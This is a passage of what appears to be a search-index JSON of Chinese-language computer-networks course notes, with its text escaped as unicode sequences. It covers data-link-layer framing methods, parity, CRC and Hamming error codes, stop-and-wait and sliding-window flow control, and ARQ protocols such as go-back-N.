\u5b57\u8282\uff09\u3002\u5f53\u63a5\u6536\u65b9\u8bfb\u53d6\u5e27\u9996\u90e8\u7684\u5b57\u8282\u8ba1\u6570\u503c\u65f6\uff0c\u5c31\u77e5\u9053\u540e\u9762\u8ddf\u968f\u7684\u5b57\u8282\u6570\u4ece\u800c\u786e\u5b9a\u7ed3\u675f\u4f4d\u7f6e\u3002</p> <p></p> <p>\u4f46\u662f\u5982\u679c\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u5dee\u9519\uff0c\u4f8b\u5982\u8ba1\u6570\u5b57\u6bb5\u9519\u8bef\uff0c\u5219\u5e27\u8fb9\u754c\u5212\u5206\u4f9d\u636e\u88ab\u7834\u574f\uff0c\u9020\u6210\u707e\u96be\u6027\u7684\u540e\u679c\uff1a</p> <p></p> <p>\u5b57\u8282\u586b\u5145\u5b9a\u754c\u7b26\u6cd5 Flag bits with Byte Stuffing</p> <p>\u4f7f\u7528\u7279\u5b9a\u5b57\u8282 <code>SOH</code> \u8868\u793a\u5e27\u7684\u5f00\u59cb\uff0c<code>EOT</code> \u8868\u793a\u5e27\u7684\u7ed3\u675f\u3002\u4e3a\u4e86\u786e\u4fdd\u6570\u636e\u672c\u8eab\u51fa\u73b0\u7684\u7279\u6b8a\u5b57\u7b26\u4e0d\u88ab\u8bef\u5224\u4f4d\u9996\u5c3e\u5b9a\u754c\u7b26\uff0c\u6211\u4eec\u5728\u7279\u6b8a\u5b57\u7b26\u524d\u586b\u5145\u8f6c\u4e49\u5b57\u7b26 <code>ESC</code> \u6765\u52a0\u4ee5\u533a\u5206\u3002</p> <p></p> <p>\u82e5\u8f6c\u4e49\u5b57\u7b26 <code>ESC</code> \u4e5f\u51fa\u73b0\u5728\u6570\u636e\u4e2d\uff0c\u5219\u5728\u5176\u524d\u9762\u518d\u6dfb\u52a0\u4e00\u4e2a <code>ESC</code> \u5373\u53ef</p> <p>\u6bd4\u7279\u586b\u5145\u5b9a\u754c\u7b26\u6cd5 Flag bits with Bit Stuffing</p> <p>\u6bd4\u7279\u586b\u5145\u6cd5\u4f7f\u7528\u4e00\u4e2a\u7279\u5b9a\u7684\u6bd4\u7279\u4e32 <code>01111110</code> (<code>0x7E</code>) \u6807\u5fd7\u4e00\u4e2a\u5e27\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u3002\u4e3a\u4e86\u4e0d\u4f7f\u6570\u636e\u5b57\u6bb5\u4e2d\u51fa\u73b0\u7684\u6bd4\u7279\u6d41\u88ab\u8bef\u5224\u4e3a\u9996\u5c3e\u6807\u5fd7\uff0c\u53d1\u9001\u65b9\u4f1a\u5148\u626b\u63cf\u6574\u4e2a\u6570\u636e\u5b57\u6bb5\uff0c\u6bcf\u9047\u5230 5 \u4e2a\u8fde\u7eed\u7684 1 \u5c31\u81ea\u52a8\u5728\u540e\u9762\u63d2\u5165\u4e00\u4e2a 0\uff0c\u4fdd\u8bc1\u6570\u636e\u5b57\u6bb5\u4e2d\u4e0d\u4f1a\u51fa\u73b0 6 \u4e2a\u8fde\u7eed\u7684 1\u3002</p> <p></p> <p>\u6bd4\u7279\u586b\u5145\u66f4\u5bb9\u6613\u88ab\u786c\u4ef6\u5b9e\u73b0\uff0c\u5176\u6027\u80fd\u7531\u4e8e\u5b57\u8282\u586b\u5145\u3002</p> <p>\u7269\u7406\u5c42\u7f16\u7801\u8fdd\u4f8b Physical layer conding violations</p> <p>\u7269\u7406\u5c42\u7f16\u7801\u8fdd\u4f8b\u786e\u4fdd\u9009\u62e9\u7684\u5b9a\u754c\u7b26\u4e0d\u4f1a\u5728\u6570\u636e\u90e8\u5206\u51fa\u73b0\u3002</p> <p>\u4f8b\u5982\u5bf9\u4e8e\u7269\u7406\u5c42\u9009\u7528\u4e86 4B/5B \u7f16\u7801\u65b9\u6848\uff0c\u5219 5-bit \u7f16\u7801\u4e2d\u6709\u4e00\u534a\u7801\u5b57\uff0816\uff09\u672a\u4f7f\u7528\uff0c\u53ef\u4ee5\u7528\u4f5c\u5e27\u5b9a\u754c\u7b26\u3002</p> <p>\u5bf9\u4e8e\u66fc\u5f7b\u65af\u7279\u7f16\u7801/\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff0c\u6301\u7eed\u7684\u9ad8\u7535\u5e73/\u4f4e\u7535\u5e73\u4e3a\u8fdd\u4f8b\u7801\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5b9a\u754c\u7b26\u3002</p> <p>\u8fdd\u4f8b\u7f16\u7801\u6cd5\u4e0d\u91c7\u7528\u4efb\u4f55\u586b\u5145\u8ba1\u6570\u5c31\u5b9e\u73b0\u4e86\u6570\u636e\u7684\u900f\u660e\u4f20\u8f93\uff0c\u4f46\u53ea\u9002\u7528\u4e8e\u5197\u4f59\u7f16\u7801\u7684\u73af\u5883</p>"},{"location":"Courses/CN/Topic2/#_4","title":"\u5dee\u9519\u63a7\u5236","text":"<p>\u6bd4\u7279\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u51fa\u73b0\u5dee\u9519\uff0c\u6211\u4eec\u901a\u5e38\u5229\u7528\u7f16\u7801\u6280\u672f\u6765\u8fdb\u884c\u5dee\u9519\u63a7\u5236\uff0c\u53ef\u5206\u4e3a\u68c0\u9519\u7f16\u7801\u548c\u7ea0\u9519\u7f16\u7801\u3002</p> <p>\u6b64\u5904\uff0c\u7801\u5b57\uff08code word\uff09\u6307\u4e00\u4e2a\u5305\u542b \\(m\\) \u4e2a\u6570\u636e\u4f4d\u548c \\(r\\) \u4e2a\u6821\u9a8c\u4f4d\u7684 \\(n=m+r\\) \u4f4d\u5355\u5143\uff0c\u63cf\u8ff0\u4e3a \\((n,m)\\) \u7801\u3002</p> <p>\u7801\u7387\u5373\u4e3a\u7801\u5b57\u4e2d\u4e0d\u542b\u5197\u4f59\u90e8\u5206\u6240\u5360\u7684\u6bd4\u7387\uff0c\u53ef\u4ee5\u7528 \\(m/n\\) \u6765\u8ba1\u7b97\u3002</p>"},{"location":"Courses/CN/Topic2/#_5","title":"\u68c0\u9519\u7f16\u7801","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u68c0\u9519\uff0c\u6211\u4eec\u5fc5\u987b\u5728\u4f20\u8f93\u65f6\u589e\u52a0\u5197\u4f59\u6821\u9a8c\u4fe1\u606f\u3002\u63a5\u6536\u65b9\u6839\u636e\u6536\u5230\u7684\u7801\u5b57\u662f\u5426\u7b26\u5408\u89c4\u5219\u6765\u5224\u65ad\u4f20\u8f93\u662f\u5426\u53d1\u751f\u9519\u8bef\u3002</p> <p>\u5947\u5076\u6821\u9a8c\u7801</p> <p>\u5947\u5076\u6821\u9a8c\u7801\u662f\u4e00\u79cd\u6700\u57fa\u672c\u7684\u68c0\u9519\u7801\uff0c\u5b83\u7531 n-1 \u4f4d\u6570\u636e\u548c 1 \u4f4d\u68c0\u9a8c\u4f4d\u7ec4\u6210\uff1a</p> <ul> <li>\u5947\u68c0\u9a8c\u7801: \u9644\u52a0\u4e00\u4e2a\u68c0\u9a8c\u4f4d\u540e\uff0cn \u4f4d\u7801\u5b57\u4e2d 1 \u7684\u4e2a\u6570\u4e3a\u5947\u6570</li> <li>\u5076\u68c0\u9a8c\u7801: \u9644\u52a0\u4e00\u4e2a\u68c0\u9a8c\u4f4d\u540e\uff0cn \u4f4d\u7801\u5b57\u4e2d 1 \u7684\u4e2a\u6570\u4e3a\u5076\u6570</li> </ul> <p>\u5947\u5076\u6821\u9a8c\u7801\u53ef\u4ee5\u68c0\u6d4b\u5947\u6570\u4f4d\u9519\u8bef\uff0c\u5373\u5982\u679c\u5b58\u5728 1, 3, 5,... \u4e2a\u6bd4\u7279\u4f4d\u4f20\u8f93\u9519\u8bef\uff0c\u5219\u53ef\u4ee5\u53d1\u73b0\u9519\u8bef\u3002</p> <p>\u5faa\u73af\u5197\u4f59\u7801</p> <p>Cyclic Redundancy Code, CRC \u662f\u6570\u636e\u94fe\u8def\u5c42\u5e7f\u6cdb\u4f7f\u7528\u7684\u68c0\u9519\u6280\u672f\u3002</p> <ul> <li>&lt;1&gt; \u53d1\u9001\u65b9\u4f9d\u636e\u4e00\u4e2a\u7ea6\u5b9a\u7684\u591a\u9879\u5f0f \\(G(x)\\) \u548c\u5f85\u53d1\u9001\u7684\u6570\u636e\uff0c\u8ba1\u7b97\u5197\u4f59\u7801\uff0c\u5c06\u5197\u4f59\u7801\u9644\u52a0\u5230\u6570\u636e\u540e\u9762\u4e00\u8d77\u53d1\u9001</li> <li>&lt;2&gt; \u63a5\u6536\u65b9\u6536\u5230\u6570\u636e\u548c\u5197\u4f59\u7801\u540e\u901a\u8fc7 \\(G(x)\\) \u8ba1\u7b97\u6570\u636e\u548c\u5197\u4f59\u7801\u662f\u5426\u4ea7\u751f\u5dee\u9519\uff0c\u505a\u9664\u6cd5\u8fd0\u7b97\uff0c\u82e5\u4f59\u6570\u4e3a 0\uff0c\u5219\u672a\u68c0\u6d4b\u51fa\u9519\u8bef</li> </ul> <p>CRC \u6709\u56db\u4e2a\u56fd\u9645\u6807\u51c6\u751f\u6210\u5f0f \\(G(x)\\)\uff0c\u5176\u4e2d\u4ee5\u592a\u7f51\u3001\u65e0\u7ebf\u5c40\u57df\u7f51\u5747\u91c7\u7528 CRC-32 \u751f\u6210\u591a\u9879\u5f0f</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5f85\u4f20\u9001\u7684 \\(m\\) \u4f4d\u6570\u636e\uff0cCRC \u8fd0\u7b97\u4ea7\u751f\u4e00\u4e2a \\(r\\) \u4f4d\u7684\u5197\u4f59\u7801\uff0c\u8fd9\u6837\u5f62\u6210\u7684\u5e27\u957f\u5ea6\u4e3a \\(m+r\\) \u4f4d\u3002</p> <p>CRC \u7684\u68c0\u9519\u80fd\u529b\u5f88\u5f3a\uff0c\u5bf9\u4e8e\u5c0f\u4e8e \\(r\\) \u4f4d\u7684\u9519\u8bef\uff0c\u4e00\u5b9a\u80fd\u591f\u68c0\u6d4b\u51fa\uff1b\u5bf9\u4e8e\u5927\u4e8e \\(r\\) \u4f4d\u7684\u9519\u8bef\uff0c\u80fd\u68c0\u6d4b\u51fa\u7684\u6982\u7387\u4e3a \\(1-2^{-r}\\)\uff0c\u8fd9\u4e2a\u503c\u975e\u5e38\u63a5\u8fd1\u4e8e 1\u3002</p> <p>CRC \u5176\u5b9e\u4e5f\u5177\u6709\u7ea0\u9519\u529f\u80fd\uff0c\u4f46\u6570\u636e\u94fe\u8def\u5c42\u53ea\u662f\u7528\u4e86\u5b83\u7684\u68c0\u9519\u529f\u80fd</p>"},{"location":"Courses/CN/Topic2/#_6","title":"\u7ea0\u9519\u7f16\u7801","text":"<p>\u6d77\u660e\u7801\u662f\u6700\u5e38\u89c1\u7684\u7ea0\u9519\u7f16\u7801\uff0c\u5176\u7279\u70b9\u662f\u5c06\u6709\u6548\u4fe1\u606f\u548c\u68c0\u9a8c\u4f4d\u5206\u914d\u5230\u51e0\u4e2a\u5947\u5076\u6821\u9a8c\u7ec4\u4e2d\uff0c\u82e5\u67d0\u4e00\u4f4d\u51fa\u9519\uff0c\u4f1a\u5f15\u8d77\u6709\u5173\u7684\u51e0\u4e2a\u68c0\u9a8c\u4f4d\u6539\u53d8\uff0c\u4ece\u800c\u627e\u51fa\u9519\u4f4d\u6240\u5728\u7684\u4f4d\u7f6e\u3002</p> <p>\u6d77\u660e\u8ddd\u79bb\uff08Hamming Distance\uff09\u662f\u4e24\u4e2a\u7801\u5b57\u4e4b\u95f4\u5bf9\u5e94\u6bd4\u7279\u4e0d\u540c\u7684\u6570\u76ee\uff0c\u4f8b\u5982 <code>00001111</code> \u548c <code>00000000</code> \u7684\u6d77\u660e\u8ddd\u79bb\u4e3a 4\u3002</p> <p>\u5982\u679c\u4e24\u4e2a\u7801\u5b57\u7684\u6d77\u660e\u8ddd\u79bb\u4e3a \\(d\\)\uff0c\u5219\u6211\u4eec\u9700\u8981 \\(d\\) \u4e2a\u6bd4\u7279\u9519\u8bef\u624d\u53ef\u4ee5\u628a\u4e00\u4e2a\u7801\u5b57\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u7801\u5b57\u3002\u636e\u6b64\uff0c\u6211\u4eec\u6709\u7406\u8bba\uff1a</p> <ul> <li>\u4e3a\u4e86\u68c0\u67e5\u51fa \\(d\\) \u4e2a\u6bd4\u7279\u9519\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6d77\u660e\u8ddd\u79bb\u4e3a \\(d+1\\) \u7684\u7f16\u7801</li> <li>\u4e3a\u4e86\u7ea0\u6b63 \\(d\\) \u4e2a\u9519\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6d77\u660e\u8ddd\u79bb\u4e3a \\(2d+1\\) \u7684\u7f16\u7801</li> </ul> \u68c0\u9519\u7ea0\u9519 <p></p> <p></p> <p>\u5047\u8bbe\u6709 \\(m\\) \u4e2a\u4fe1\u606f\u4f4d\uff0c\\(r\\) \u4e2a\u6821\u9a8c\u4f4d\uff0c\u4e3a\u4e86\u8bbe\u8ba1\u4e00\u4e2a\u53ef\u4ee5\u7ea0\u6b63\u5355\u6bd4\u7279\u9519\u8bef\u7684\u7ea0\u9519\u7801\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651\u7801\u5b57\u53ef\u4ee5\u8868\u793a\u7684\u6709\u6548\u4fe1\u606f\u4e2a\u6570\u3002</p> <p>\\(m\\) \u4e2a\u4fe1\u606f\u4f4d\u5bf9\u5e94\u4e86 \\(2^m\\) \u4e2a\u6709\u6548\u4fe1\u606f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6709\u6548\u4fe1\u606f\uff0c\u5171\u6709 \\(n\\) \u4e2a\u4e0e\u5176\u8ddd\u79bb\u4e3a 1 \u7684\u53ef\u7ea0\u9519\u975e\u6cd5\u7801\u5b57\uff0c\u518d\u52a0\u4e0a\u5b83\u81ea\u5df1\u5171 \\(n+1\\) \u4e2a\u4f4d\u6a21\u5f0f\u3002</p> <p>\u6211\u4eec\u9700\u8981\u4fdd\u8bc1\u7801\u5b57\u7684\u53ef\u8868\u793a\u7684\u4fe1\u606f \\(2^n\\) \u5927\u4e8e\u6240\u6709\u4f4d\u6a21\u5f0f\u4e2a\u6570\u4e4b\u548c\uff0c\u5373\u6709 \\((n+1)2^m \\le 2^n\\)\u3002\u53c8 \\(n=m+r\\)\uff0c\u6211\u4eec\u6709\u4e0d\u7b49\u5f0f\uff1a</p> \\[ (m+r+1) \\le 2^r \\] <p>\u5373\u5728\u5df2\u77e5 \\(m\\) \u7684\u524d\u63d0\u4e0b\u53ef\u4ee5\u8ba1\u7b97\u7ea0\u9519\u5355\u6bd4\u7279\u9519\u8bef\u6821\u9a8c\u4f4d\u6570 \\(r\\) \u7684\u4e0b\u754c\u3002</p> <p>\u5982\u679c\u8981\u7ea0\u9519\u4e24\u6bd4\u7279\u9519\u8bef\uff0c\u5219\u5171\u6709 \\(C_n^2\\) \u4e2a\u8ddd\u79bb\u4e3a 2 \u7684\u53ef\u7ea0\u9519\u975e\u6cd5\u7801\u5b57</p> <p>\u4e3a\u4e86\u7406\u89e3\u6d77\u660e\u7801\u7f16\u7801\u8fc7\u7a0b\uff0c\u6211\u4eec\u4ee5 \\((15,11)\\) \u6d77\u660e\u7801\u4e3a\u4f8b\uff0c\u5b83\u8bbe\u7f6e\u4e86\u5982\u4e0b\u5947\u5076\u6821\u9a8c\u7ec4\uff1a</p> <p></p> <p>\u56fe\u4e2d\u5df2\u7ecf\u586b\u5165\u6570\u636e\u4f4d <code>01011001101</code>\uff0c\u6839\u636e\u8bbe\u7f6e\u7684\u6821\u9a8c\u7ec4\u8ba1\u7b97\u6821\u9a8c\u4f4d\u7684\u503c\u5982\u4e0a\uff0c\u5f97\u5230\u6700\u540e\u7684\u7801\u5b57 <code>100110101001101</code>\u3002</p> <p>\u90a3\u4e48\u6b64\u65f6\u5982\u679c\u6709 1 bit \u6570\u636e\u53d1\u751f\u9519\u8bef\uff0c\u90a3\u4e48\u6211\u4eec\u6839\u636e\u8fd9\u56db\u7ec4\u6821\u9a8c\u53ef\u4ee5\u786e\u5b9a\u8be5\u4f4d\u5904\u4e8e\u54ea\u4e00\u5217\u54ea\u4e00\u884c\uff0c\u4ece\u800c\u5b9e\u73b0\u7ea0\u9519\u3002</p> <p>PPT \u4e2d\u8fd8\u8bb2\u4e86 Reed-Solomon Code\uff0c\u6b64\u5904\u6682\u65f6\u4e0d\u5199</p>"},{"location":"Courses/CN/Topic2/#_7","title":"\u6d41\u91cf\u63a7\u5236","text":"<p>\u6d41\u91cf\u63a7\u5236\u662f\u7531\u63a5\u6536\u65b9\u63a7\u5236\u53d1\u9001\u65b9\u7684\u53d1\u9001\u901f\u7387\uff0c\u4f7f\u63a5\u6536\u65b9\u6709\u8db3\u591f\u7f13\u51b2\u7a7a\u95f4\u6765\u63a5\u6536\u6bcf\u4e2a\u5e27\u3002</p> <p>\u505c\u6b62-\u7b49\u5f85\u534f\u8bae</p> <p>\u505c\u6b62-\u7b49\u5f85\u534f\u8bae\u662f\u4e00\u79cd\u7b80\u5355\u7684\u6d41\u91cf\u63a7\u5236\u65b9\u6cd5\uff0c\u53d1\u9001\u65b9\u6bcf\u6b21\u53ea\u5141\u8bb8\u53d1\u9001\u4e00\u4e2a\u5e27\uff0c\u53d1\u9001\u540e\u6682\u505c\uff0c\u7b49\u5f85\u786e\u8ba4\u5230\u8fbe\u540e\u53d1\u9001\u4e0b\u4e00\u5e27\uff1b\u63a5\u6536\u65b9\u63a5\u6536\u5230\u4e00\u5e27\u540e\uff0c\u9700\u8981\u6062\u590d\u786e\u8ba4\u63a5\u6536\u3002</p> <p></p> <p>\u786e\u8ba4\u5e27\u4e5f\u88ab\u79f0\u4e3a\u54d1\u5e27 dummy frame</p> <p>\u4e00\u4e2a\u5e27\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u635f\u574f\uff0c\u6b64\u65f6\u63a5\u6536\u65b9\u53ef\u4ee5\u901a\u8fc7\u5dee\u9519\u63a7\u5236\u68c0\u6d4b\uff1b\u4f46\u4e00\u4e2a\u5e27\u4e5f\u6709\u53ef\u80fd\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e22\u5931\uff0c\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53d1\u9001\u65b9\u9700\u8981\u589e\u52a0\u8d85\u65f6\u673a\u5236\uff0c\u5728\u8ba1\u65f6\u5668\u8fbe\u5230\u4e00\u5b9a\u65f6\u95f4\u540e\u4ecd\u7136\u6ca1\u6709\u6536\u5230\u786e\u8ba4\u65f6\uff0c\u81ea\u52a8\u91cd\u53d1\u8be5\u5e27\u3002</p> <p>\u6709\u4e86\u8d85\u65f6\u673a\u5236\uff0c\u5c31\u53ef\u80fd\u51fa\u73b0\u63a5\u6536\u65b9\u591a\u6b21\u6536\u5230\u540c\u4e00\u4e2a\u5e27\u7684\u60c5\u51b5\uff0c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u5728\u5e27\u5934\u90e8\u8bbe\u7f6e\u5e8f\u5217\u53f7 SEQ\uff0c\u4ee5\u5224\u65ad\u8fd9\u4e2a\u662f\u65b0\u5e27\u8fd8\u662f\u5e94\u8be5\u4e22\u5f03\u7684\u91cd\u590d\u5e27\u3002</p> <p></p> <p>\u5728\u8fd9\u4e2a\u534f\u8bae\u4e2d\uff0c\u552f\u4e00\u4e0d\u660e\u786e\u7684\u5730\u65b9\u53ea\u6709\u76f8\u90bb\u4e24\u4e2a\u5e27\u7684\u6bd4\u5bf9\uff0c\u56e0\u6b64\u6b64\u5904\u53ea\u9700\u8981\u4f7f\u7528 1-bit \u7684\u5e8f\u5217\u53f7\u5373\u53ef\u3002</p> <p>\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae</p> <p>\u6570\u636e\u94fe\u8def\u5c42\u548c\u4f20\u8f93\u5c42\u5728\u6d41\u91cf\u63a7\u5236\u4e0a\u5747\u7528\u5230\u4e86\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\uff0c\u5b83\u4eec\u533a\u522b\u5982\u4e0b</p> <ul> <li>\u6570\u636e\u94fe\u8def\u5c42\u63a7\u5236\u7684\u662f\u76f8\u90bb\u8282\u70b9\u4e4b\u95f4\u7684\u6d41\u91cf\uff1b\u800c\u4f20\u8f93\u5c42\u63a7\u5236\u7684\u662f\u7aef\u5230\u7aef\u7684\u6d41\u91cf</li> <li>\u6570\u636e\u94fe\u8def\u5c42\u7684\u63a7\u5236\u624b\u6bb5\u662f\u63a5\u6536\u65b9\u6536\u4e0d\u4e0b\u65f6\u5c31\u4e0d\u8fd4\u56de\u786e\u8ba4\uff1b\u4f20\u8f93\u5c42\u7684\u63a7\u5236\u624b\u6bb5\u662f\u63a5\u6536\u65b9\u901a\u8fc7\u786e\u8ba4\u62a5\u6587\u6bb5\u4e2d\u7684\u7a97\u53e3\u503c\u6765\u8c03\u6574\u53d1\u9001\u65b9\u7684\u53d1\u9001\u7a97\u53e3</li> </ul> <p>\u6ed1\u52a8\u7a97\u53e3\u6d41\u91cf\u63a7\u5236\u662f\u4e00\u79cd\u66f4\u9ad8\u6548\u7684\u6d41\u91cf\u63a7\u5236\u65b9\u6cd5\uff0c\u53d1\u9001\u65b9\u7ef4\u62a4\u4e00\u7ec4\u8fde\u7eed\u7684\u5141\u8bb8\u53d1\u9001\u5e27\u7684\u5e8f\u53f7\uff0c\u79f0\u4e3a\u53d1\u9001\u7a97\u53e3\uff0c\u5927\u5c0f\u4e3a \\(W_T\\)\uff1b\u63a5\u6536\u65b9\u7ef4\u62a4\u4e00\u7ec4\u8fde\u7eed\u7684\u5141\u8bb8\u63a5\u6536\u5e27\u7684\u5e8f\u53f7\uff0c\u79f0\u4e3a\u63a5\u6536\u7a97\u53e3\uff0c\u5927\u5c0f\u4e3a \\(W_R\\)\u3002</p> <p>\u53d1\u9001\u65b9\u6bcf\u6536\u5230\u4e00\u4e2a\u6309\u5e8f\u786e\u8ba4\u7684\u786e\u8ba4\u5e27\uff0c\u5c31\u5c06\u53d1\u9001\u7a97\u53e3\u5411\u524d\u6ed1\u52a8\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5e8f\u53f7\u843d\u5165\u53d1\u9001\u7a97\u53e3\u5185\u7684\u6570\u636e\u5e27\u53ef\u4ee5\u7ee7\u7eed\u53d1\u9001\uff0c\u5f53\u7a97\u53e3\u5185\u5168\u662f\u5df2\u53d1\u9001\u4f46\u8fd8\u672a\u6536\u5230\u786e\u8ba4\u7684\u5e27\u65f6\uff0c\u53d1\u9001\u65b9\u5c31\u505c\u6b62\u53d1\u9001\u3002</p> <p>\u63a5\u6536\u65b9\u53ea\u5141\u8bb8\u63a5\u6536\u63a5\u6536\u7a97\u53e3\u4e4b\u5185\u7684\u5e27\uff0c\u5e76\u4e14\u6bcf\u6536\u5230\u4e00\u4e2a\u5e8f\u53f7\u843d\u5165\u63a5\u6536\u7a97\u53e3\u7684\u6570\u636e\u5e27\u65f6\uff0c\u5c31\u5c06\u63a5\u6536\u7a97\u53e3\u5411\u524d\u6ed1\u52a8\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u5e76\u4e3a\u8be5\u5e27\u53d1\u56de\u4e00\u4e2a\u786e\u8ba4\u3002</p> <p>\u636e\u6b64\uff0c\u53ea\u6709\u63a5\u6536\u65b9\u53d1\u9001\u4e86\u786e\u8ba4\uff0c\u63a5\u6536\u7a97\u53e3\u5411\u524d\u6ed1\u52a8\u540e\uff0c\u53d1\u9001\u7a97\u53e3\u624d\u80fd\u5411\u524d\u6ed1\u52a8</p> <p>\u6839\u636e\u6ed1\u52a8\u7a97\u53e3\u7684\u5927\u5c0f\u4e0d\u540c\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86\u4e0d\u540c\u7684\u53ef\u9760\u4f20\u8f93\u65b9\u6848\uff1a</p> <ul> <li>\u505c\u6b62-\u7b49\u5f85\u534f\u8bae: \u53d1\u9001\u7a97\u53e3 \\(W_T=1\\)\uff0c\u63a5\u6536\u7a97\u53e3 \\(W_R=1\\)</li> <li>\u540e\u9000N\u5e27\u534f\u8bae: \u53d1\u9001\u7a97\u53e3 \\(W_T\\gt 1\\)\uff0c\u63a5\u6536\u7a97\u53e3 \\(W_R=1\\)</li> <li>\u9009\u62e9\u91cd\u4f20\u534f\u8bae: \u53d1\u9001\u7a97\u53e3 \\(W_T\\gt 1\\)\uff0c\u63a5\u6536\u7a97\u53e3 \\(W_R\\gt 1\\)</li> </ul>"},{"location":"Courses/CN/Topic2/#_8","title":"\u53ef\u9760\u4f20\u8f93","text":"<p>\u53ef\u9760\u4f20\u8f93\u6307\u53d1\u9001\u65b9\u53d1\u9001\u7684\u6570\u636e\u90fd\u80fd\u88ab\u63a5\u6536\u65b9\u6b63\u786e\u63a5\u6536\uff0c\u901a\u5e38\u91c7\u7528\u786e\u8ba4\u548c\u8d85\u65f6\u91cd\u4f20\u4e24\u4e2a\u673a\u5236\u5b8c\u6210\uff0c\u8fd9\u79cd\u534f\u8bae\u4e5f\u88ab\u79f0\u4e3a\u81ea\u52a8\u91cd\u4f20\u8bf7\u6c42\uff08ARQ\uff09\u3002</p> <p>\u5728 ARQ \u534f\u8bae\u4e2d\uff0c\u6570\u636e\u5e27\u548c\u786e\u8ba4\u5e27\u90fd\u9700\u8981\u7f16\u53f7\uff0c\u4ee5\u533a\u5206\u6570\u636e\u5e27\u548c\u786e\u8ba4\u5e27\u7684\u5bf9\u5e94\u5173\u7cfb\u3002</p> <p>\u505c\u6b62-\u7b49\u5f85\u534f\u8bae S-W</p> <p>\u4ece\u6ed1\u52a8\u7a97\u53e3\u89d2\u5ea6\u6765\u770b\uff0c\u505c\u6b62\u7b49\u5f85\u534f\u8bae\u7684\u53d1\u9001\u7a97\u53e3\u548c\u63a5\u6536\u7a97\u53e3\u5927\u5c0f\u5747\u4e3a 1\u3002</p> <p>\u6b63\u5982\u4e0a\u9762\u6240\u8bf4\uff0c\u505c\u6b62\u7b49\u5f85\u534f\u8bae\u6bcf\u53d1\u9001\u4e00\u4e2a\u5e27\u5c31\u7b49\u5f85\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u8bc1\u8fde\u7eed\u7684\u4e24\u4e2a\u5e27\u5e8f\u53f7\u4e0d\u540c\u5373\u53ef\uff0c\u91c7\u7528 1-bit \u6765\u7f16\u7801\uff0c\u53d1\u9001\u5e27\u4ea4\u66ff\u4f7f\u7528 0 \u548c 1 \u6807\u8bc6\uff0c\u786e\u8ba4\u5e27\u4ea4\u66ff\u4f7f\u7528 ACK0 \u548c ACK1 \u6807\u8bc6\u3002</p> <p>\u82e5\u8fde\u7eed\u51fa\u73b0\u4e24\u4e2a\u76f8\u540c\u5e8f\u53f7\u7684\u6570\u636e\u5e27\uff0c\u5219\u8bf4\u660e\u53d1\u9001\u65b9\u8fdb\u884c\u4e86\u8d85\u65f6\u91cd\u4f20\uff1b\u82e5\u8fde\u7eed\u51fa\u73b0\u4e24\u4e2a\u76f8\u540c\u5e8f\u53f7\u7684\u786e\u8ba4\u5e27\uff0c\u5219\u8bf4\u660e\u63a5\u6536\u65b9\u6536\u5230\u4e86\u91cd\u590d\u5e27\u3002</p> <p>\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u90fd\u8d77\u7801\u6709\u4e00\u4e2a\u5e27\u5927\u5c0f\u7684\u5e27\u7f13\u51b2\u533a\uff0c\u4ee5\u4fdd\u5b58\u53ef\u80fd\u9700\u8981\u91cd\u4f20\u7684\u5e27\u526f\u672c</p> <p>\u540e\u9000 N \u5e27\u534f\u8bae GBN</p> <p>\u540e\u9000 N \u5e27\u6307\u53d1\u9001\u65b9\u53d1\u9001 N \u4e2a\u6570\u636e\u5e27\u540e\uff0c\u82e5\u53d1\u73b0\u8fd9 N \u4e2a\u6570\u636e\u5e27\u7684\u524d\u4e00\u4e2a\u6570\u636e\u5e27\u5728\u8d85\u65f6\u540e\u4ecd\u672a\u6536\u5230\u786e\u8ba4\uff0c\u5219\u8be5\u5e27\u88ab\u5224\u51fa\u9519\u6216\u4e22\u5931\uff0c\u6b64\u65f6\u53d1\u9001\u65b9\u9700\u8981\u91cd\u4f20\u8be5\u5e27\u4ee5\u53ca\u5176\u540e\u7684 N \u5e27\u3002</p> <p></p> <p>\u63a5\u6536\u65b9\u4ecd\u7136\u5fc5\u987b\u6309\u987a\u5e8f\u63a5\u6536\u5e27\uff0c\u4f46\u662f GBN \u534f\u8bae\u4e2d\u8fd8\u5141\u8bb8\u63a5\u6536\u65b9\u8fdb\u884c\u7d2f\u79ef\u786e\u8ba4\uff0c\u5373\u5141\u8bb8\u63a5\u6536\u65b9\u5728\u8fde\u7eed\u6536\u5230\u591a\u4e2a\u6b63\u786e\u6570\u636e\u5e27\u540e\uff0c\u53ea\u5bf9\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5e27\u8fd4\u56de\u786e\u8ba4\uff0c\u8868\u793a\u8be5\u5e27\u53ca\u4e4b\u524d\u7684\u5e27\u5747\u5df2\u6b63\u786e\u6536\u5230\u3002</p> <p>GBN \u534f\u8bae\u4e2d\uff0c\u53d1\u9001\u7a97\u53e3 \\(W_T\\) 